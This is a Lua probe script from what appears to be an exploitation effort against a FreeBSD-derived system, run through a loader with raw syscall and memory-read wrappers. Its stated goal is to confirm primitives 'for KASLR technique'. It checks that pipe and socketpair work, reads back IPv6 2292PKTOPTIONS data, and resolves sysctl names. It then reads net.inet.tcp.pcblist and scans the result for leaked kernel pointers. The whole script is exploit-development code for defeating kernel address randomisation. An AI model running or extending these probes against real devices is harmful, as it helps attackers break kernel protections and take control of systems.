-- CRASH_CLASS: LOW
-- PROBE 143r: Verify pipe + socketpair through loader wrappers
--
-- Context: 143p confirmed syscall.pipe/socketpair exist but sections F/G
-- never ran. Need to verify these primitives work for KASLR technique.

print("=== PROBE 143r: PIPE + SOCKETPAIR ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function hexq(val)
    if val == nil then return "nil" end
    if type(val) == "table" and val.h then
        return string.format("0x%08X%08X", val.h, val.l)
    end
    return string.format("0x%X", to_num(val))
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end

--------------------------------------------------------------------
-- [A] Canary
--------------------------------------------------------------------
print("--- [A] Canary ---")
local ok, pid = pcall(function() return syscall.getpid() end)
print("[A] getpid=" .. tostring(pid))

--------------------------------------------------------------------
-- [B] Pipe
--------------------------------------------------------------------
print("")
print("--- [B] Pipe ---")
if syscall.pipe then
    local pipefds = memory.alloc(16)
    local ok_p, rv_p = pcall(function() return syscall.pipe(uint64(pipefds)) end)
    if ok_p then
        local rv_n = to_num(rv_p)
        print("[B] pipe() ret=" .. rv_n)
        if rv_n == 0 then
            local rfd = safe_rd(pipefds)
            local wfd = safe_rd(pipefds + 4)
            print("[B] read_fd=" .. tostring(rfd) .. " write_fd=" .. tostring(wfd))

            -- Write test data
            local wbuf = memory.alloc(64)
            memory.write_qword(wbuf, uint64("0xDEADBEEFCAFEBABE"))
            local ok_w, rv_w = pcall(function()
                return syscall.write(uint64(wfd), uint64(wbuf), uint64(8))
            end)
            print("[B] write ret=" .. tostring(rv_w))

            -- Read it back
            local rbuf = memory.alloc(64)
            local ok_r, rv_r = pcall(function()
                return syscall.read(uint64(rfd), uint64(rbuf), uint64(8))
            end)
            if ok_r then
                print("[B] read ret=" .. to_num(rv_r))
                if to_num(rv_r) > 0 then
                    print("[B] data=" .. hexq(safe_rq(rbuf)))
                end
            else
                print("[B] read FAIL: " .. tostring(rv_r))
            end

            pcall(function() syscall.close(uint64(rfd)) end)
            pcall(function() syscall.close(uint64(wfd)) end)
            print("[B] >>> PIPE WORKS <<<")
        end
    else
        print("[B] pipe FAIL: " .. tostring(rv_p))
    end
else
    print("[B] syscall.pipe nil")
end

--------------------------------------------------------------------
-- [C] Socketpair
--------------------------------------------------------------------
print("")
print("--- [C] Socketpair ---")
if syscall.socketpair then
    local spfds = memory.alloc(16)
    local ok_sp, rv_sp = pcall(function()
        return syscall.socketpair(uint64(1), uint64(1), uint64(0), uint64(spfds))
    end)
    if ok_sp then
        local rv_n = to_num(rv_sp)
        print("[C] socketpair(AF_LOCAL,SOCK_STREAM) ret=" .. rv_n)
        if rv_n == 0 then
            local fd0 = safe_rd(spfds)
            local fd1 = safe_rd(spfds + 4)
            print("[C] fd0=" .. tostring(fd0) .. " fd1=" .. tostring(fd1))

            -- Write through one end
            local sbuf = memory.alloc(64)
            memory.write_qword(sbuf, uint64("0x1122334455667788"))
            local ok_sw, rv_sw = pcall(function()
                return syscall.write(uint64(fd0), uint64(sbuf), uint64(8))
            end)
            print("[C] write(fd0) ret=" .. tostring(rv_sw))

            -- Read from other end
            local rbuf2 = memory.alloc(64)
            local ok_sr, rv_sr = pcall(function()
                return syscall.read(uint64(fd1), uint64(rbuf2), uint64(8))
            end)
            if ok_sr then
                print("[C] read(fd1) ret=" .. to_num(rv_sr))
                if to_num(rv_sr) > 0 then
                    print("[C] data=" .. hexq(safe_rq(rbuf2)))
                end
            end

            pcall(function() syscall.close(uint64(fd0)) end)
            pcall(function() syscall.close(uint64(fd1)) end)
            print("[C] >>> SOCKETPAIR WORKS <<<")
        end
    else
        print("[C] socketpair FAIL: " .. tostring(rv_sp))
    end
else
    print("[C] syscall.socketpair nil")
end

--------------------------------------------------------------------
-- [D] IPv6 socket + 2292PKTOPTIONS readback
--------------------------------------------------------------------
print("")
print("--- [D] IPv6 2292PKTOPTIONS ---")

local sock_fd = nil
local ok_s, fd = pcall(function()
    return syscall.socket(uint64(28), uint64(2), uint64(0))
end)
if ok_s then sock_fd = to_num(fd) end

if sock_fd and sock_fd >= 0 then
    print("[D] IPv6 fd=" .. sock_fd)

    -- Set some 2292 options
    local optval = memory.alloc(8)
    memory.write_dword(optval, 1)
    pcall(function() syscall.setsockopt(uint64(sock_fd), uint64(41), uint64(19), uint64(optval), uint64(4)) end)
    pcall(function() syscall.setsockopt(uint64(sock_fd), uint64(41), uint64(20), uint64(optval), uint64(4)) end)
    print("[D] Set 2292PKTINFO + 2292HOPLIMIT")

    -- Try getsockopt(IPV6_2292PKTOPTIONS = 25)
    local optbuf = memory.alloc(0x200)
    local optlenp = memory.alloc(8)
    for off = 0, 0x1FF, 4 do memory.write_dword(optbuf + off, 0xDDDDDDDD) end
    memory.write_qword(optlenp, uint64(0x200))

    local ok_g, rv_g = pcall(function()
        return syscall.getsockopt(uint64(sock_fd), uint64(41), uint64(25), uint64(optbuf), uint64(optlenp))
    end)

    if ok_g then
        local rv_n = to_num(rv_g)
        local gotlen = to_num(memory.read_qword(optlenp))
        print("[D] getsockopt(25) ret=" .. rv_n .. " len=" .. gotlen)

        if rv_n == 0 and gotlen > 0 then
            print("[D] >>> PKTOPTIONS RETURNED DATA <<<")
            for off = 0, math.min(gotlen - 4, 0x100), 4 do
                local dw = safe_rd(optbuf + off)
                if dw and dw ~= 0xDDDDDDDD and dw ~= 0 then
                    print("[D] +" .. string.format("%02X", off) .. "=0x" .. string.format("%08X", dw))
                end
            end
        elseif rv_n == 0 and gotlen == 0 then
            print("[D] PKTOPTIONS returned 0 bytes (empty)")
        else
            print("[D] PKTOPTIONS ret=" .. rv_n .. " (blocked?)")
        end
    else
        print("[D] getsockopt(25) PCALL FAIL: " .. tostring(rv_g))
    end

    pcall(function() syscall.close(uint64(sock_fd)) end)
else
    print("[D] socket FAIL")
end

--------------------------------------------------------------------
-- [E] sysctl name2oid for one safe target
--------------------------------------------------------------------
print("")
print("--- [E] sysctl name2oid ---")

local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end

local sc_sysctl = make_syscall(202)

local mib_n2o = memory.alloc(16)
memory.write_dword(mib_n2o, 0)
memory.write_dword(mib_n2o + 4, 3)

local name_str = "kern.osreldate"
local name_buf = memory.alloc(64)
for i = 1, #name_str do
    memory.write_byte(name_buf + i - 1, string.byte(name_str, i))
end
memory.write_byte(name_buf + #name_str, 0)

local oid_out = memory.alloc(64)
local oid_len = memory.alloc(8)
memory.write_qword(oid_len, uint64(64))

local ok_n, rv_n = pcall(function()
    return sc_sysctl(uint64(mib_n2o), uint64(2), uint64(oid_out), uint64(oid_len), uint64(name_buf), uint64(#name_str))
end)

if ok_n then
    local rv_num = to_num(rv_n)
    print("[E] name2oid(kern.osreldate) ret=" .. rv_num)
    if rv_num == 0 then
        local got = to_num(memory.read_qword(oid_len))
        local oid_cnt = math.floor(got / 4)
        local oid_str = ""
        for i = 0, oid_cnt - 1 do
            oid_str = oid_str .. tostring(safe_rd(oid_out + i*4)) .. "."
        end
        print("[E] OID={" .. oid_str .. "} (" .. got .. " bytes)")

        -- Now read it
        local val_buf = memory.alloc(16)
        local val_len = memory.alloc(8)
        memory.write_qword(val_len, uint64(16))
        local ok_v, rv_v = pcall(function()
            return sc_sysctl(uint64(oid_out), uint64(oid_cnt), uint64(val_buf), uint64(val_len), uint64(0), uint64(0))
        end)
        if ok_v and to_num(rv_v) == 0 then
            local val = safe_rd(val_buf)
            print("[E] kern.osreldate = " .. tostring(val))
        else
            print("[E] sysctl read ret=" .. tostring(rv_v))
        end
    end
else
    print("[E] name2oid PCALL FAIL: " .. tostring(rv_n))
end

--------------------------------------------------------------------
-- [F] Try name2oid for net.inet.tcp.pcblist
--------------------------------------------------------------------
print("")
print("--- [F] TCP pcblist lookup ---")

local tcp_name = "net.inet.tcp.pcblist"
local tcp_buf = memory.alloc(64)
for i = 1, #tcp_name do
    memory.write_byte(tcp_buf + i - 1, string.byte(tcp_name, i))
end
memory.write_byte(tcp_buf + #tcp_name, 0)

memory.write_qword(oid_len, uint64(64))
for off = 0, 60, 4 do memory.write_dword(oid_out + off, 0) end

local ok_t, rv_t = pcall(function()
    return sc_sysctl(uint64(mib_n2o), uint64(2), uint64(oid_out), uint64(oid_len), uint64(tcp_buf), uint64(#tcp_name))
end)

if ok_t then
    local rv_tn = to_num(rv_t)
    print("[F] name2oid(tcp.pcblist) ret=" .. rv_tn)
    if rv_tn == 0 then
        local got = to_num(memory.read_qword(oid_len))
        local oid_cnt = math.floor(got / 4)
        local oid_str = ""
        for i = 0, oid_cnt - 1 do
            oid_str = oid_str .. tostring(safe_rd(oid_out + i*4)) .. "."
        end
        print("[F] >>> TCP PCBLIST OID={" .. oid_str .. "} <<<")

        -- Query size first
        local size_len = memory.alloc(8)
        memory.write_qword(size_len, uint64(0))
        local ok_sz, rv_sz = pcall(function()
            return sc_sysctl(uint64(oid_out), uint64(oid_cnt), uint64(0), uint64(size_len), uint64(0), uint64(0))
        end)
        if ok_sz and to_num(rv_sz) == 0 then
            local needed = to_num(memory.read_qword(size_len))
            print("[F] pcblist needs " .. needed .. " bytes")
            if needed > 0 and needed <= 0x20000 then
                local pcb_buf = memory.alloc(needed + 16)
                memory.write_qword(size_len, uint64(needed + 16))
                local ok_rd, rv_rd = pcall(function()
                    return sc_sysctl(uint64(oid_out), uint64(oid_cnt), uint64(pcb_buf), uint64(size_len), uint64(0), uint64(0))
                end)
                if ok_rd and to_num(rv_rd) == 0 then
                    local got2 = to_num(memory.read_qword(size_len))
                    print("[F] pcblist read " .. got2 .. " bytes")
                    local kpc = 0
                    for off = 0, math.min(got2 - 8, 0x1FFF8), 8 do
                        local q = safe_rq(pcb_buf + off)
                        if q then
                            local h,l = get_hi_lo(q)
                            if h >= 0xFFFF8000 and h ~= 0xFFFFFFFF then
                                kpc = kpc + 1
                                if kpc <= 10 then
                                    print("[F] !!! KPTR +" .. string.format("%X",off) .. "=" .. hexq(q))
                                end
                            end
                        end
                    end
                    if kpc > 0 then
                        print("[F] >>> TCP PCBLIST LEAKED " .. kpc .. " KERNEL PTRS <<<")
                    else
                        print("[F] pcblist: zero kernel pointers")
                        -- Dump first 128 bytes
                        for off = 0, math.min(got2-4, 124), 4 do
                            local dw = safe_rd(pcb_buf + off)
                            if dw and dw ~= 0 then
                                print("[F] +" .. string.format("%02X",off) .. "=0x" .. string.format("%08X",dw))
                            end
                        end
                    end
                else
                    print("[F] pcblist read ret=" .. tostring(rv_rd))
                end
            end
        else
            print("[F] pcblist size ret=" .. tostring(rv_sz))
        end
    end
else
    print("[F] name2oid PCALL FAIL: " .. tostring(rv_t))
end

print("")
print("=== PROBE 143r COMPLETE ===")
